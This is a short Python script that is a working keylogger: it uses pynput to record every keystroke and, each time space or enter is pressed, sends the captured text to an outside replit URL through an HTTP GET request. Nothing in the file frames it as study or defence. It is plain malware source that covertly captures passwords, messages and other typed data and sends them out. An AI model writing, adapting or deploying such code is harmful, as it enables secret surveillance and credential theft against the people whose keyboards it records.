import pynput
import requests
from pynput.keyboard import Key, Listener

keys = ""

def on_press(key):
    global keys
    if key == Key.space:
        keys += " "
    elif key == Key.enter:
        keys += "\n"
    else:
        try:
            keys += key.char
        except:
            pass

    pass

def on_release(key):
    global keys
    if key == Key.space or key == Key.enter:
        print(keys)
        requests.get("https://RaptorProTips-1.sunghyounk.repl.co?keys="+keys)
        keys=""
    pass

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()